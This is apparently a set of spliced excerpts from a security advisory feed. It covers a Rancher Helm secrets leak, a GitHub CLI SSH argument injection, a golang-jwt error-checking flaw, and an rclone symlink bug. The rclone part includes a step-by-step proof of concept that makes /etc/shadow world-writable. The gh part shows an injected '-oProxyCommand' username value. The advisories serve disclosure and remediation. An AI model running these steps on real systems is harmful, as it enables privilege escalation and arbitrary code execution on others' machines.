Additionally, the same information leaks into auditing logs when the audit level is set to equal or above 2.</p>\n<p>Application charts without sensitive data are not affected by this vulnerability.\nThis vulnerability impacts any Helm applications installed on a Rancher Manager cluster, regardless of it being installed via the Marketplace or using the helm cli.</p>\n<p>Please consult the associated <a href=\"https://attack.mitre.org/techniques/T1068/\">MITRE ATT&amp;CK - Technique - Exploitation for Privilege Escalation</a> for further information about this category of attack.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Patched versions include Rancher Manager <code>2.9.5</code> and <code>2.8.10</code>. The fix ensures that all Helm values for each App are stored as Kubernetes Secrets.

This vulnerability could enable privilege escalation and unauthorized access to critical system files (e.g., /etc/shadow), compromising system integrity, confidentiality, and availability.</p>\n<p>For instance, an unprivileged user could set a symlink to a sensitive file within their home directory, waiting for an administrator or automated process (e.g., a cron job running with elevated privileges) to copy their files with rclone using the --links and --metadata options. Upon copying, rclone will incorrectly apply chown and chmod to the symlinkâs target file rather than just the symlink itself, resulting in ownership and permission changes on the sensitive file.</p>\n<h3 id=\"who-is-affected\">Who is affected</h3>\n<p>If you are not using <code>--metadata</code> <strong>and</strong> <code>--links</code> <strong>and</strong> copying files <strong>to</strong> the local backend you are not affected by this issue.</p>\n<p>If you are using <code>--metadata</code> and <code>-links</code> and copying files to the local backend but not as a superuser, then this will manifest itself as a bug by setting incorrect permissions.</p>\n<p>If you are using <code>--metadata</code> and <code>-links</code> and copying files to the local backend but as a superuser then this could affect you.</p>\n<h3 id=\"details\">Details</h3>\n<p>When copying directories containing symlinks with rclone using the --links and --metadata options, rclone mistakenly applies chown and chmod operations to the target of the symlink instead of the symlink itself. As a result, ownership and permissions on sensitive system files (e.g., /etc/shadow) may be altered if they are the target of any symlink within the copied directory structure. This allows users to affect the permissions and ownership of files they should not have access to, resulting in privilege escalation and potential system compromise.</p>\n<h3 id=\"poc\">PoC</h3>\n<pre><code># Create a directory to simulate a user home directory\nroot@workstation:~# mkdir -p /tmp/home/user1\nroot@workstation:~# sudo chown user1:user1 /tmp/home/user1\n</code></pre>\n<pre><code># As user1, create a symlink to /etc/shadow within their home directory\nroot@workstation:~# sudo -u user1 ln -s /etc/shadow /tmp/home/user1/shadow_link\n</code></pre>\n<pre><code># List permissions on the original files\nroot@workstation:~# ls -l /tmp/home/user1/shadow_link /etc/shadow\n----------. 1 root  root  1283 Nov  5 13:30 /etc/shadow\nlrwxrwxrwx. 1 user1 user1   11 Nov  5 13:56 /tmp/home/user1/shadow_link -&gt; /etc/shadow\n</code></pre>\n<pre><code># Copy the directory structure with rclone\nroot@workstation:~# rclone copy /tmp/home /tmp/home_new --links --metadata --log-level=DEBUG\n2024/11/05 13:56:53 DEBUG : rclone: Version \"v1.68.1\" starting with parameters [\"rclone\" \"copy\" \"/tmp/home\" \"/tmp/home_new\" \"--links\" \"--metadata\" \"--log-level=DEBUG\"]\n2024/11/05 13:56:53 DEBUG : Creating backend with remote \"/tmp/home\"\n2024/11/05 13:56:53 NOTICE: Config file \"/root/.config/rclone/rclone.conf\" not found - using defaults\n2024/11/05 13:56:53 DEBUG : local: detected overridden config - adding \"{b6816}\" suffix to name\n2024/11/05 13:56:53 DEBUG : fs cache: renaming cache item \"/tmp/home\" to be canonical \"local{b6816}:/tmp/home\"\n2024/11/05 13:56:53 DEBUG : Creating backend with remote \"/tmp/home_new\"\n2024/11/05 13:56:53 DEBUG : local: detected overridden config - adding \"{b6816}\" suffix to name\n2024/11/05 13:56:53 DEBUG : fs cache: renaming cache item \"/tmp/home_new\" to be canonical \"local{b6816}:/tmp/home_new\"\n2024/11/05 13:56:53 DEBUG : Added delayed dir = \"user1\", newDst=&lt;nil&gt;\n2024/11/05 13:56:53 DEBUG : user1/shadow_link.rclonelink: Need to transfer - File not found at Destination\n2024/11/05 13:56:53 DEBUG : user1/shadow_link.rclonelink: md5 = 2fe8599cb25a0c790213d39b3be97c27 OK\n2024/11/05 13:56:53 INFO  : user1/shadow_link.rclonelink: Copied (new)\n2024/11/05 13:56:53 DEBUG : Local file system at /tmp/home_new: Waiting for checks to finish\n2024/11/05 13:56:53 DEBUG : Local file system at /tmp/home_new: Waiting for transfers to finish\n2024/11/05 13:56:53 INFO  : user1: Updated directory metadata\n2024/11/05 13:56:53 INFO  :\nTransferred:             11 B / 11 B, 100%, 0 B/s, ETA -\nTransferred:            1 / 1, 100%\nElapsed time:         0.0s\n\n2024/11/05 13:56:53 DEBUG : 6 go routines active\n</code></pre>\n<pre><code># List permissions again\nroot@workstation:~# ls -l /tmp/home/user1/shadow_link /etc/shadow /tmp/home_new/user1/shadow_link\n-rwxrwxrwx. 1 user1 user1 1283 Nov  5 13:30 /etc/shadow                                                 # Wrong, very wrong.

GitHub CLI <a href=\"https://github.com/cli/cli/blob/30066b0042d0c5928d959e288144300cb28196c9/internal/codespaces/rpc/invoker.go#L230-L244\">retrieves SSH connection details</a>, such as remote username, which is used in <a href=\"https://github.com/cli/cli/blob/e356c69a6f0125cfaac782c35acf77314f18908d/pkg/cmd/codespace/ssh.go#L263\">executing <code>ssh</code> commands</a> for <code>gh codespace ssh</code> or <code>gh codespace logs</code> commands.</p>\n<p>This exploit occurs when a malicious third-party devcontainer contains a modified SSH server that injects <code>ssh</code> arguments within the SSH connection details. <code>gh codespace ssh</code> and <code>gh codespace logs</code> commands could execute arbitrary code on the user's workstation if the remote username contains something like <code>-oProxyCommand=\"echo hacked\" #</code>.  The <code>-oProxyCommand</code> flag causes <code>ssh</code> to execute the provided command while <code>#</code> shell comment causes any other <code>ssh</code> arguments to be ignored.</p>\n<p>In <code>2.62.0</code>, the remote username information is being validated before being used.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Successful exploitation could lead to arbitrary code execution on the user's workstation, potentially compromising the user's data and system.</p>\n<h3 id=\"remediation-and-mitigation\">Remediation and Mitigation</h3>\n<ol>\n<li>Upgrade <code>gh</code> to <code>2.62.0</code></li>\n<li>Exercise caution when using custom devcontainer images, prefer default or pre-built devcontainers from trusted sources.</li>\n</ol>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/cli/cli/security/advisories/GHSA-p2h2-3vg9-4p87\">https://github.com/cli/cli/security/advisories/GHSA-p2h2-3vg9-4p87</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-52308\">https://nvd.nist.gov/vuln/detail/CVE-2024-52308</a></li>\n<li><a href=\"https://pkg.go.dev/vuln/GO-2024-3269\">https://pkg.go.dev/vuln/GO-2024-3269</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p2h2-3vg9-4p87\">https://github.com/advisories/GHSA-p2h2-3vg9-4p87</a></li>\n</ul>\n",

            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Unclear documentation of the error behavior in <code>ParseWithClaims</code> can lead to situation where users are potentially not checking errors in the way they should be. Especially, if a token is both expired and invalid, the errors returned by <code>ParseWithClaims</code> return both error codes. If users only check for the <code>jwt.ErrTokenExpired </code> using <code>error.Is</code>, they will ignore the embedded <code>jwt.ErrTokenSignatureInvalid</code> and thus potentially accept invalid tokens.</p>\n<h3 id=\"fix\">Fix</h3>\n<p>We have back-ported the error handling logic from the <code>v5</code> branch to the <code>v4</code> branch. In this logic, the <code>ParseWithClaims</code> function will immediately return in \"dangerous\" situations (e.g., an invalid signature), limiting the combined errors only to situations where the signature is valid, but further validation failed (e.g., if the signature is valid, but is expired AND has the wrong audience). This fix is part of the 4.5.1 release.</p>\n<h3 id=\"workaround\">Workaround</h3>\n<p>We are aware that this changes the behaviour of an established function and is not 100 % backwards compatible, so updating to 4.5.1 might break your code. In case you cannot update to 4.5.0, please make sure that you are properly checking for all errors (\"dangerous\" ones first), so that you are not running in the case detailed above.</p>\n<pre><code class=\"language-Go\">token, err := /* jwt.Parse or similar */\nif token.Valid {\n    fmt.Println(\"You look nice today\")\n} else if errors.Is(err, jwt.ErrTokenMalformed) {\n    fmt.Println(\"That's not even a token\")\n} else if errors.Is(err, jwt.ErrTokenUnverifiable) {\n    fmt.Println(\"We could not verify this token\")\n} else if errors.Is(err, jwt.ErrTokenSignatureInvalid) {\n    fmt.Println(\"This token has an invalid signature\")\n} else if errors.Is(err, jwt.ErrTokenExpired) || errors.Is(err, jwt.ErrTokenNotValidYet) {\n    // Token is either expired or not active yet\n    fmt.Println(\"Timing is everything\")\n} else {\n    fmt.Println(\"Couldn't handle this token:\", err)\n}\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/golang-jwt/jwt/security/advisories/GHSA-29wx-vh33-7x7r\">https://github.com/golang-jwt/jwt/security/advisories/GHSA-29wx-vh33-7x7r</a></li>\n<li><a href=\"https://github.com/golang-jwt/jwt/commit/7b1c1c00a171c6c79bbdb40e4ce7d197060c1c2c\">https://github.com/golang-jwt/jwt/commit/7b1c1c00a171c6c79bbdb40e4ce7d197060c1c2c</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-51744\">https://nvd.nist.gov/vuln/detail/CVE-2024-51744</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-29wx-vh33-7x7r\">https://github.com/advisories/GHSA-29wx-vh33-7x7r</a></li>\n</ul>\n",
